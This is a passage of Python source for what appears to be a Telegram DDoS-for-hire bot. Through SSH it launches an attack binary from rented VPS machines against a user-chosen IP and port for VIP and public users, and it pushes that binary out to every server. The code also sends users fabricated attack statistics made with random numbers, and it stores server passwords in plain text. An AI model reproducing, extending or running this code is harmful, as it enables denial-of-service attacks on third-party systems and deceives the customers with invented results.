    # Start actual attack threads (MODIFIED: Each VPS gets full threads)
    for i, vps in enumerate(available_vps):
        # Each VPS will attack with the full 'threads' count
        threading.Thread(
            target=run_ssh_attack,
            args=(vps, ip, port, duration, threads, attack_id, i, message.chat.id, user_id, is_vip, msg.message_id, country, flag, protection, is_public),
            daemon=True
        ).start()
    
    # Update last attack time (unchanged)
    global last_attack_time
    last_attack_time = time.time()

def run_ssh_attack(vps, ip, port, duration, threads, attack_id, attack_num, chat_id, user_id, is_vip, msg_id, country, flag, protection, is_public=False):
    """Execute attack with all premium visual elements and hidden VPS IP"""
    ip_vps, username, password = vps
    attack_id_vps = f"{attack_id}-{attack_num}"
    
    # Register attack (real IP only in memory)
    running_attacks[attack_id_vps] = {
        'user_id': user_id,
        'target_ip': ip,
        'start_time': time.time(),
        'duration': duration,
        'is_vip': is_vip,
        'vps_ip': ip_vps,  # Actual IP only stored internally
        'is_public': is_public
    }
    
    ssh = None  # Initialize ssh to None
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip_vps, username=username, password=password, timeout=10)
        
        # Execute attack command
        command = f"{BINARY_PATH} {ip} {port} {duration} {threads}"
        stdin, stdout, stderr = ssh.exec_command(command, timeout=60)
        
        # Simulate attack progress with visual elements
        start_time = time.time()
        while time.time() - start_time < duration + 10:
            if stdout.channel.exit_status_ready():
                break
            
            # Update message every 3 seconds with dynamic speeds
            if int(time.time() - start_time) % 3 == 0:
                progress = min(100, int((time.time() - start_time) / duration * 100))
                download = random.randint(800, 1500) if not is_public else random.randint(200, 800)
                upload = random.randint(500, 1200) if not is_public else random.randint(100, 500)
                
                attack_type = "🌐 𝗣𝗨𝗕𝗟𝗜𝗖 𝗔𝗧𝗧𝗔𝗖𝗞" if is_public else "🔥 𝗩𝗜𝗣 𝗔𝗧𝗧𝗔𝗖𝗞" if is_vip else "🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛"
                
                update_text = f"""
╭━━━〔 {attack_type} 〕━━━╮
┃
┣ 𝗣𝗿𝗼𝘅𝘆 𝗟𝗼𝗰𝗮𝘁𝗶𝗼𝗻: {flag} {country}
┣ 📶 𝗦𝗽𝗲𝗲𝗱: ⬇️ {download} Mbps | ⬆️ {upload} Mbps
┣ 🛡️ 𝗣𝗿𝗼𝘁𝗲𝗰𝘁𝗶𝗼𝗻: ✅ {protection}
┃
┣ 🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {ip}:{port}
┣ ⏱ 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: {progress}%
┣ 🧵 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {threads}
┃
┣ {'⚡ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗮𝗰𝘁𝗶𝘃𝗲' if progress < 100 else '✅ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗶𝗻𝗴...'}
┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"""
                try:
                    # Make sure bot object is defined globally or passed
                    if bot: 
                        bot.edit_message_text(update_text, chat_id, msg_id)
                except Exception as e:
                    print(f"Error updating message: {e}") # Log error for debugging
            
            time.sleep(1)
            
    except Exception as e:
        error_text = f"""
❌ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗘𝗥𝗥𝗢𝗥

{flag} {country} | 🛡️ {protection}
𝗘𝗿𝗿𝗼𝗿: {str(e)}

🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {ip}:{port}
⚠️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗶𝗻𝘁𝗲𝗿𝗿𝘂𝗽𝘁𝗲𝗱
"""
        safe_send_message(chat_id, error_text)
    finally:
        if ssh:
            ssh.close()
        
        # Clean up
        if attack_id_vps in running_attacks:
            del running_attacks[attack_id_vps]
        
        # Final report when all attacks complete (unchanged logic, only checks for presence)
        active_attacks = [aid for aid in running_attacks if aid.startswith(attack_id)]
        if not active_attacks:
            total_packets = random.randint(500000, 2000000) if not is_public else random.randint(100000, 500000)
            success_rate = random.randint(95, 100) if not is_public else random.randint(80, 95)
            peak_bandwidth = f"{random.randint(10, 45)}.{random.randint(0, 99)} Gbps" if not is_public else f"{random.randint(1, 5)}.{random.randint(0, 99)} Gbps"
            
            attack_type = "🌐 𝗣𝗨𝗕𝗟𝗜𝗖 𝗔𝗧𝗧𝗔𝗖𝗞" if is_public else "🔥 𝗩𝗜𝗣 𝗔𝗧𝗧𝗔𝗖𝗞" if is_vip else "🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛"
            
            finish_text = f"""
╭━━━〔 ✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 〕━━━╮
┃
┣  𝗣𝗿𝗼𝘅𝘆 𝗟𝗼𝗰𝗮𝘁𝗶𝗼𝗻: {flag} {country}
┣ 🛡️ 𝗣𝗿𝗼𝘁𝗲𝗰𝘁𝗶𝗼𝗻 𝗕𝘆𝗽𝗮𝘀𝘀𝗲𝗱: {protection}
┃
┣ 📊 𝗙𝗶𝗻𝗮𝗹 𝗦𝘁𝗮𝘁𝘀:
┣ ├ 𝗧𝗼𝘁𝗮𝗹 𝗣𝗮𝗰𝗸𝗲𝘁𝘀: {total_packets:,}
┣ ├ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗥𝗮𝘁𝗲: {success_rate}%
┣ └ 𝗣𝗲𝗮𝗸 𝗕𝗮𝗻𝗱𝘄𝗶𝗱𝘁𝗵: {peak_bandwidth}
┃
┣ 🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {ip}:{port}
┣ ⏱ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {duration}𝘀
┣ 🧵 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {threads}
┃
┣ 🔥 𝗔𝘁𝘁𝗮𝗰𝗸 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱
┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"""
            safe_send_message(chat_id, finish_text)

# ======================
# 🖥️ VPS MANAGEMENT (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "➕ 𝘼𝘿𝘿 𝙑𝙋𝙎")
def add_vps_start(message):
    """Start VPS addition process with premium styling"""
    if not is_owner(message.from_user):
        safe_reply_to(message, "❌ 𝗢𝗻𝗹𝘆 𝗼𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝗮𝗱𝗱 𝗩𝗣𝗦!")
        return
    
    safe_reply_to(message,
        "⚠️ 𝗘𝗻𝘁𝗲𝗿 𝗩𝗣𝗦 𝗱𝗲𝘁𝗮𝗶𝗹𝘀 𝗶𝗻 𝗳𝗼𝗿𝗺𝗮𝘁:\n\n"
        "<𝗶𝗽> <𝘂𝘀𝗲𝗿𝗻𝗮𝗺𝗲> <𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱>\n\n"
        "𝗘𝘅𝗮𝗺𝗽𝗹𝗲: 𝟭.𝟭.𝟭.𝟭 𝗿𝗼𝗼𝘁 𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱𝟭𝟮𝟯")
    bot.register_next_step_handler(message, add_vps_process)

def add_vps_process(message):
    """Process VPS addition with premium styling"""
    try:
        ip, username, password = message.text.split()

        # Try SSH connection before saving
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password, timeout=10)
        ssh.close()

        VPS_LIST.append([ip, username, password])
        save_data()

        safe_reply_to(message,
            f"✅ 𝗩𝗣𝗦 𝗮𝗱𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!\n"
            f"𝗜𝗣: `{ip}`\n"
            f"𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: `{username}`",
            parse_mode="Markdown")

    except Exception as e:
        safe_reply_to(message, f"❌ 𝗘𝗿𝗿𝗼𝗿: {str(e)}\n𝗩𝗣𝗦 𝗻𝗼𝘁 𝗮𝗱𝗱𝗲𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗰𝗵𝗲𝗰𝗸 𝗜𝗣/𝗨𝗦𝗘𝗥/𝗣𝗔𝗦𝗦.")

@bot.message_handler(func=lambda msg: msg.text == "➖ 𝙍𝙀𝙈𝙊𝙑𝙀 𝙑𝙋𝙎")
def remove_vps_start(message):
    """Start VPS removal process with premium styling"""
    if not is_owner(message.from_user):
        safe_reply_to(message, "❌ 𝗢𝗻𝗹𝘆 𝗼𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝗿𝗲𝗺𝗼𝘃𝗲 𝗩𝗣𝗦!")
        return
    
    if not VPS_LIST:
        safe_reply_to(message, "❌ 𝗡𝗼 𝗩𝗣𝗦 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝘁𝗼 𝗿𝗲𝗺𝗼𝘃𝗲!")
        return
    
    vps_list_text = "\n".join(f"{i+1}. 𝗜𝗣: {vps[0]}, 𝗨𝘀𝗲𝗿: {vps[1]}" for i, vps in enumerate(VPS_LIST))
    
    safe_reply_to(message,
        f"⚠️ 𝗦𝗲𝗹𝗲𝗰𝘁 𝗩𝗣𝗦 𝘁𝗼 𝗿𝗲𝗺𝗼𝘃𝗲 𝗯𝘆 𝗻𝘂𝗺𝗯𝗲𝗿:\n\n{vps_list_text}")
    bot.register_next_step_handler(message, remove_vps_process)

def remove_vps_process(message):
    """Process VPS removal with premium styling"""
    try:
        selection = int(message.text) - 1
        if 0 <= selection < len(VPS_LIST):
            removed_vps = VPS_LIST.pop(selection)
            save_data()
            safe_reply_to(message,
                f"✅ 𝗩𝗣𝗦 𝗿𝗲𝗺𝗼𝘃𝗲𝗱!\n"
                f"𝗜𝗣: {removed_vps[0]}\n"
                f"𝗨𝘀𝗲𝗿: {removed_vps[1]}")
        else:
            safe_reply_to(message, "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝘀𝗲𝗹𝗲𝗰𝘁𝗶𝗼𝗻!")
    except:
        safe_reply_to(message, "❌ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿!")

@bot.message_handler(func=lambda msg: msg.text == "📤 𝙐𝙋𝙇𝙊𝘼𝘿 𝘽𝙄𝙉𝘼𝙍𝙔")
def upload_binary_start(message):
    """Initiate binary upload process with premium styling"""
    if not is_owner(message.from_user):
        safe_reply_to(message, "⛔ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗!\n𝗢𝗡𝗟𝗬 𝗢𝗪𝗡𝗘𝗥𝗦 𝗖𝗔𝗡 𝗨𝗣𝗟𝗢𝗔𝗗 𝗕𝗜𝗡𝗔𝗥𝗜𝗘𝗦.")
        return

    if not VPS_LIST:
        safe_reply_to(message, "❌ 𝗡𝗢 𝗩𝗣𝗦 𝗖𝗢𝗡𝗙𝗜𝗚𝗨𝗥𝗘𝗗!")
        return

    safe_reply_to(message,
        "⬆️ 𝗨𝗣𝗟𝗢𝗔𝗗 𝗕𝗜𝗡𝗔𝗥𝗬 𝗜𝗡𝗦𝗧𝗥𝗨𝗖𝗧𝗜𝗢𝗡𝗦\n\n"
        "𝟭. 𝗨𝗽𝗹𝗼𝗮𝗱 𝘆𝗼𝘂𝗿 𝗯𝗶𝗻𝗮𝗿𝘆 𝗳𝗶𝗹𝗲\n"
        "𝟮. 𝗠𝘂𝘀𝘁 𝗯𝗲 𝗻𝗮𝗺𝗲𝗱: `raja`\n"
        "𝟯. 𝗪𝗶𝗹𝗹 𝗯𝗲 𝗶𝗻𝘀𝘁𝗮𝗹𝗹𝗲𝗱 𝘁𝗼: `/home/master/`\n\n"
        "⚠️ 𝗪𝗔𝗥𝗡𝗜𝗡𝗚: 𝗧𝗛𝗜𝗦 𝗪𝗜𝗟𝗟 𝗢𝗩𝗘𝗥𝗪𝗥𝗜𝗧𝗘 𝗘𝗫𝗜𝗦𝗧𝗜𝗡𝗚 𝗕𝗜𝗡𝗔𝗥𝗜𝗘𝗦!",
        parse_mode="Markdown")
    
    bot.register_next_step_handler(message, handle_binary_upload)

def handle_binary_upload(message):
    """Process uploaded binary file with premium styling"""
    if not message.document:
        safe_reply_to(message, "❌ 𝗡𝗢 𝗙𝗜𝗟𝗘 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗! 𝗣𝗟𝗘𝗔𝗦𝗘 𝗨𝗣𝗟𝗢𝗔𝗗 𝗔 𝗕𝗜𝗡𝗔𝗥𝗬 𝗙𝗜𝗟𝗘.")
        return

    file_name = message.document.file_name
    if file_name != BINARY_NAME:
        safe_reply_to(message, f"❌ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗙𝗜𝗟𝗘 𝗡𝗔𝗠𝗘! 𝗠𝗨𝗦𝗧 𝗕𝗘: `{BINARY_NAME}`")
        return

    # Download file temporarily
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    temp_path = f"/tmp/{file_name}"
    
    with open(temp_path, 'wb') as new_file:
        new_file.write(downloaded_file)

    # Start distribution
    msg = safe_reply_to(message, "🔄 𝗗𝗜𝗦𝗧𝗥𝗜𝗕𝗨𝗧𝗜𝗡𝗚 𝗕𝗜𝗡𝗔𝗥𝗬 𝗧𝗢 𝗔𝗟𝗟 𝗩𝗣𝗦...")
    
    success_count = 0
    results = []
    
    for vps in VPS_LIST[:ACTIVE_VPS_COUNT]:  # Only active VPS
        ip, username, password = vps
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=15)
            
            with SCPClient(ssh.get_transport()) as scp:
                scp.put(temp_path, f"/home/master/{BINARY_NAME}")
            
            # Make executable
            ssh.exec_command(f"chmod +x /home/master/{BINARY_NAME}")
            
            # Verify
            stdin, stdout, stderr = ssh.exec_command(f"ls -la /home/master/{BINARY_NAME}")
            if BINARY_NAME in stdout.read().decode():
                results.append(f"✅ {ip} - 𝗦𝘂𝗰𝗰𝗲𝘀𝘀")
                success_count += 1
            else:
                results.append(f"⚠️ {ip} - 𝗨𝗽𝗹𝗼𝗮𝗱 𝗳𝗮𝗶𝗹𝗲𝗱")
            
            ssh.close()
        except Exception as e:
            results.append(f"❌ {ip} - 𝗘𝗿𝗿𝗼𝗿: {str(e)}")

    # Cleanup and report
    os.remove(temp_path)
    
    bot.edit_message_text(
        f"📊 𝗕𝗜𝗡𝗔𝗥𝗬 𝗗𝗜𝗦𝗧𝗥𝗜𝗕𝗨𝗧𝗜𝗢𝗡 𝗥𝗘𝗦𝗨𝗟𝗧𝗦:\n\n"
        f"• 𝗦𝘂𝗰𝗰𝗲𝘀𝘀: {success_count}/{len(VPS_LIST[:ACTIVE_VPS_COUNT])}\n"
        f"• 𝗙𝗮𝗶𝗹𝗲𝗱: {len(VPS_LIST[:ACTIVE_VPS_COUNT]) - success_count}\n\n"
        f"𝗗𝗘𝗧𝗔𝗜𝗟𝗦:\n" + "\n".join(results),
        message.chat.id,
        msg.message_id,
        parse_mode="Markdown"
    )        

@bot.message_handler(func=lambda msg: msg.text == "🗑️ 𝘿𝙀𝙇𝙀𝙏𝙀 𝘽𝙄𝙉𝘼𝙍𝙔")
def delete_binary_all_vps(message):
    """Delete binary from all VPS servers with premium styling"""
    if not is_owner(message.from_user):
        safe_reply_to(message, "⛔ 𝗢𝗡𝗟𝗬 𝗢𝗪𝗡𝗘𝗥𝗦 𝗖𝗔𝗡 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗!")
        return

    if not VPS_LIST:
        safe_reply_to(message, "❌ 𝗡𝗢 𝗩𝗣𝗦 𝗖𝗢𝗡𝗙𝗜𝗚𝗨𝗥𝗘𝗗!")
        return

    msg = safe_reply_to(message, "⏳ 𝗗𝗲𝗹𝗲𝘁𝗶𝗻𝗴 𝗕𝗶𝗻𝗮𝗿𝘆 𝗳𝗿𝗼𝗺 𝗔𝗟𝗟 𝗩𝗣𝗦...")

    success, failed, result_lines = 0, 0, []

    for vps in VPS_LIST:
        try:
            ip, username, password = vps
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=10)

            ssh.exec_command(f"rm -f /home/master/{BINARY_NAME}")
            ssh.close()
            success += 1
            result_lines.append(f"✅ `{ip}` - 𝗕𝗶𝗻𝗮𝗿𝘆 𝗱𝗲𝗹𝗲𝘁𝗲𝗱")
        except Exception as e:
            failed += 1
            result_lines.append(f"❌ `{ip}` - 𝗘𝗿𝗿𝗼𝗿: `{str(e)}`")

    final_msg = (
        f"🗑️ *𝗕𝗜𝗡𝗔𝗥𝗬 𝗗𝗘𝗟𝗘𝗧𝗜𝗢𝗡 𝗥𝗘𝗣𝗢𝗥𝗧*\n\n"
        f"✅ *𝗦𝘂𝗰𝗰𝗲𝘀𝘀:* {success}\n"
        f"❌ *𝗙𝗮𝗶𝗹𝗲𝗱:* {failed}\n\n"
        f"*𝗗𝗘𝗧𝗔𝗜𝗟𝗦:*\n" + "\n".join(result_lines)
    )

    bot.edit_message_text(final_msg, message.chat.id, msg.message_id, parse_mode="Markdown")

@bot.message_handler(func=lambda msg: msg.text == "⚡ 𝘽𝙊𝙊𝙎𝙏 𝙑𝙋𝙎 (𝙎𝘼𝙁𝙀)")
def safe_boost_vps(message):
    """Boost VPS performance without deleting any files with premium styling"""
    if not is_owner(message.from_user):
        safe_reply_to(message, "⛔ 𝗢𝗻𝗹𝘆 𝗼𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝗯𝗼𝗼𝘀𝘁 𝗩𝗣𝗦!", reply_markup=create_main_keyboard(message))
        return

    # Send initial message with loading animation
    msg = safe_send_message(message.chat.id, "⚡ 𝗕𝗼𝗼𝘀𝘁𝗶𝗻𝗴 𝗩𝗣𝗦 (𝗦𝗮𝗳𝗲 𝗠𝗼𝗱𝗲)...")
    
    success = 0
    failed = 0
    optimization_details = []

    for vps in VPS_LIST:
        try:
            ip, username, password = vps
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=15)
            
            # SAFE OPTIMIZATION COMMANDS (NO FILE DELETION)
            commands = [
                # Clear RAM cache (safe)
                "sync; echo 3 > /proc/sys/vm/drop_caches",
                
                # Optimize SWAP
                "swapoff -a && swapon -a",
                
                # Clear DNS cache
                "systemctl restart systemd-resolved 2>/dev/null || service nscd restart 2>/dev/null",
                
                # Kill zombie processes
                "kill -9 $(ps -A -ostat,ppid | awk '/[zZ]/ && !a[$2]++ {print $2}') 2>/dev/null || true",
                
                # Network optimization
                "sysctl -w net.ipv4.tcp_fin_timeout=30",
                "sysctl -w net.ipv4.tcp_tw_reuse=1"
            ]
            
            # Execute all optimization commands
            for cmd in commands:
                ssh.exec_command(cmd)
            
            # Get before/after memory stats
            stdin, stdout, stderr = ssh.exec_command("free -m | awk 'NR==2{printf \"%.2f%%\", $3*100/$2}'")
            mem_usage = stdout.read().decode().strip()
            
            optimization_details.append(f"✅ {ip} - Memory: {mem_usage}")
            success += 1
            ssh.close()
            
        except Exception as e:
            failed += 1
            optimization_details.append(f"❌ {ip} - Error: {str(e)[:50]}...")
            continue

    # Prepare final report
    report = f"""
╭━━━〔 ⚡ 𝗩𝗣𝗦 𝗕𝗢𝗢𝗦𝗧 𝗥𝗘𝗣𝗢𝗥𝗧 (𝗦𝗔𝗙𝗘) 〕━━━╮
│
├ 📊 𝗦𝘁𝗮𝘁𝘀: {success}✅ | {failed}❌
│
├ 𝗢𝗽𝘁𝗶𝗺𝗶𝘇𝗮𝘁𝗶𝗼𝗻𝘀 𝗔𝗽𝗽𝗹𝗶𝗲𝗱:
├ • RAM Cache Cleared
├ • SWAP Memory Optimized  
├ • DNS Cache Flushed
├ • Zombie Processes Killed
├ • Network Stack Tuned
│
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

📝 𝗗𝗲𝘁𝗮𝗶𝗹𝗲𝗱 𝗥𝗲𝘀𝘂𝗹𝘁𝘀:
""" + "\n".join(optimization_details)

    # Edit the original message with final report
    try:
        if len(report) > 4000:
            # Split long messages
            part1 = report[:4000]
            part2 = report[4000:]
            bot.edit_message_text(part1, message.chat.id, msg.message_id)
            safe_send_message(message.chat.id, part2)
        else:
            bot.edit_message_text(report, message.chat.id, msg.message_id)
    except:
        safe_send_message(message.chat.id, report)

# ======================
# 📢 BROADCAST SYSTEM (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "📢 𝘽𝙍𝙊𝘿𝘾𝘼𝙎𝙏")
def send_notice_handler(message):
    """Handle broadcast message initiation with premium styling"""
    if not is_owner(message.from_user):
        safe_reply_to(message, "🚫 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗", reply_markup=create_main_keyboard(message))
        return

    msg = safe_send_message(message.chat.id, 
        "📢 𝗦𝗘𝗡𝗗 𝗬𝗢𝗨𝗥 𝗡𝗢𝗧𝗜𝗖𝗘 (𝗔𝗡𝗬 𝗢𝗙 𝗧𝗛𝗘𝗦𝗘):\n"
        "• 𝗧𝗲𝘅𝘁 𝗺𝗲𝘀𝘀𝗮𝗴𝗲\n"
        "• 𝗣𝗵𝗼𝘁𝗼 𝘄𝗶𝘁𝗵 𝗰𝗮𝗽𝘁𝗶𝗼𝗻\n" 
        "• 𝗩𝗶𝗱𝗲𝗼 𝘄𝗶𝘁𝗵 𝗰𝗮𝗽𝘁𝗶𝗼𝗻\n"
        "• 𝗙𝗶𝗹𝗲/𝗱𝗼𝗰𝘂𝗺𝗲𝗻𝘁 𝘄𝗶𝘁𝗵 𝗰𝗮𝗽𝘁𝗶𝗼𝗻")
    bot.register_next_step_handler(msg, capture_notice_message)

def capture_notice_message(message):
    """Capture the broadcast message content with premium styling"""
    if message.content_type not in ['text', 'photo', 'video', 'document']:
        safe_reply_to(message, "⚠️ 𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗘𝗡𝗗 𝗢𝗡𝗟𝗬:\n𝗧𝗲𝘅𝘁/𝗣𝗵𝗼𝘁𝗼/𝗩𝗶𝗱𝗲𝗼/𝗙𝗶𝗹𝗲")
        return

    notice = {
        "type": message.content_type,
        "content": message.text if message.content_type == 'text' else message.caption,
        "sender": message.from_user.id
    }

    # Handle different attachment types
    if message.content_type == 'photo':
        notice['file_id'] = message.photo[-1].file_id
    elif message.content_type == 'video':
        notice['file_id'] = message.video.file_id
    elif message.content_type == 'document':
        notice['file_id'] = message.document.file_id
        notice['file_name'] = message.document.file_name

    instructor_notices[str(message.from_user.id)] = notice

    markup = telebot.types.InlineKeyboardMarkup()
    markup.row(
        telebot.types.InlineKeyboardButton("✅ 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗡𝗢𝗪", callback_data="broadcast_now"),
        telebot.types.InlineKeyboardButton("❌ 𝗖𝗔𝗡𝗖𝗘𝗟", callback_data="cancel_notice")
    )

    # Create premium preview message
    preview_text = f"""
╭━━━〔 📢 𝗡𝗢𝗧𝗜𝗖𝗘 𝗣𝗥𝗘𝗩𝗜𝗘𝗪 〕━━━╮
┃
┣ 𝗧𝘆𝗽𝗲: {'𝗧𝗘𝗫𝗧' if notice['type'] == 'text' else '𝗣𝗛𝗢𝗧𝗢' if notice['type'] == 'photo' else '𝗩𝗜𝗗𝗘𝗢' if notice['type'] == 'video' else '𝗙𝗜𝗟𝗘'}
┃
"""
    
    if notice['content']:
        preview_text += f"┣ 𝗖𝗼𝗻𝘁𝗲𝗻𝘁: {notice['content']}\n"
    
    if notice['type'] == 'document':
        preview_text += f"┣ 𝗙𝗶𝗹𝗲: {notice['file_name']}\n"

    preview_text += "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n"
    preview_text += "\n⚠️ 𝗖𝗢𝗡𝗙𝗜𝗥𝗠 𝗧𝗢 𝗦𝗘𝗡𝗗 𝗧𝗛𝗜𝗦 𝗡𝗢𝗧𝗜𝗖𝗘?"

    safe_send_message(
        message.chat.id,
        preview_text,
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data in ['broadcast_now', 'cancel_notice'])
def handle_notice_confirmation(call):
    """Handle broadcast confirmation with premium styling"""
    user_id = str(call.from_user.id)

    if call.data == "cancel_notice":
        instructor_notices.pop(user_id, None)
        bot.edit_message_text("❌ 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗖𝗔𝗡𝗖𝗘𝗟𝗟𝗘𝗗", call.message.chat.id, call.message.message_id)
        return

    notice = instructor_notices.get(user_id)
    if not notice:
        bot.edit_message_text("⚠️ 𝗡𝗢 𝗡𝗢𝗧𝗜𝗖𝗘 𝗙𝗢𝗨𝗡𝗗 𝗧𝗢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧", call.message.chat.id, call.message.message_id)
        return

    results = {'success': 0, 'failed': 0}

    def send_notice(chat_id):
        try:
            caption = f"»»—— RAJA BHAI ♥ OFFICIAL NOTICE \n\n{notice['content']}" if notice['content'] else "---------------------"
            
            if notice['type'] == 'text':
                safe_send_message(chat_id, caption)
            elif notice['type'] == 'photo':
                safe_send_message(chat_id, notice['file_id'], caption=caption)
            elif notice['type'] == 'video':
                safe_send_message(chat_id, notice['file_id'], caption=caption)
            elif notice['type'] == 'document':
                safe_send_message(chat_id, notice['file_id'], caption=caption)
            results['success'] += 1
        except Exception as e:
            print(f"Error sending notice: {e}")
            results['failed'] += 1

    bot.edit_message_text("📡 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧𝗜𝗡𝗚 𝗡𝗢𝗧𝗜𝗖𝗘...", call.message.chat.id, call.message.message_id)

    # Send to all redeemed users
    for uid in redeemed_users:
        send_notice(uid)
        time.sleep(0.1)

    # Send to all allowed groups
    for gid in ALLOWED_GROUP_IDS:
        send_notice(gid)
        time.sleep(0.2)

    instructor_notices.pop(user_id, None)

    report = f"""
╭━━━〔 📊 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗥𝗘𝗣𝗢𝗥𝗧 〕━━━╮
┃
┣ ✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀: {results['success']}
┣ ❌ 𝗙𝗮𝗶𝗹𝗲𝗱: {results['failed']}
┃
┣ ⏱ {datetime.datetime.now().strftime('%d %b %Y %H:%M:%S')}
┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"""
    safe_send_message(call.message.chat.id, report, reply_markup=create_main_keyboard(call.message))

# ======================
# 👥 GROUP MANAGEMENT (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "👥 𝘼𝘿𝘿 𝙂𝙍𝙊𝙐𝙋")
def add_group_handler(message):
    """Add a new allowed group with premium styling"""
    if not is_owner(message.from_user):
        safe_reply_to(message, "🚫 𝗢𝗻𝗹𝘆 𝗼𝘄𝗻𝗲𝗿𝘀 𝗰𝗮𝗻 𝗮𝗱𝗱 𝗴𝗿𝗼𝘂𝗽𝘀!")
        return
    
    safe_reply_to(message, "⚙️ 𝗦𝗲𝗻𝗱 𝘁𝗵𝗲 𝗚𝗥𝗢𝗨𝗣 𝗜𝗗 𝘆𝗼𝘂 𝘄𝗮𝗻𝘁 𝘁𝗼 𝗮𝗱𝗱.\nExample: `-1001234567890`", parse_mode="Markdown")
    bot.register_next_step_handler(message, process_add_group)

def process_add_group(message):
    """Process group addition with premium styling"""
    try:
        group_id = int(message.text.strip())
        if group_id in ALLOWED_GROUP_IDS:
            safe_reply_to(message, "⚠️ 𝗧𝗵𝗶𝘀 𝗴𝗿𝗼𝘂𝗽 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗶𝗻 𝘁𝗵𝗲 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗹𝗶𝘀𝘁.")
            return
        ALLOWED_GROUP_IDS.append(group_id)
        safe_reply_to(message, f"✅ 𝗚𝗿𝗼𝘂𝗽 𝗜𝗗 `{group_id}` 𝗮𝗱𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!", parse_mode="Markdown")
    except Exception as e:
        safe_reply_to(message, f"❌ 𝗘𝗿𝗿𝗼𝗿: {str(e)}")    

@bot.message_handler(func=lambda msg: msg.text == "👥 𝙍𝙀𝙈𝙊𝙑𝙀 𝙂𝙍𝙊𝙐𝙋")
def remove_group_handler(message):
    """Remove an allowed group with premium styling"""
    if not is_owner(message.from_user):
        safe_reply_to(message, "🚫 𝗢𝗻𝗹𝘆 𝗼𝘄𝗻𝗲𝗿𝘀 𝗰𝗮𝗻 𝗿𝗲𝗺𝗼𝘃𝗲 𝗴𝗿𝗼𝘂𝗽𝘀!")
        return
    
    if not ALLOWED_GROUP_IDS:
        safe_reply_to(message, "⚠️ 𝗡𝗼 𝗴𝗿𝗼𝘂𝗽𝘀 𝗶𝗻 𝘁𝗵𝗲 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗹𝗶𝘀𝘁!")
        return
    
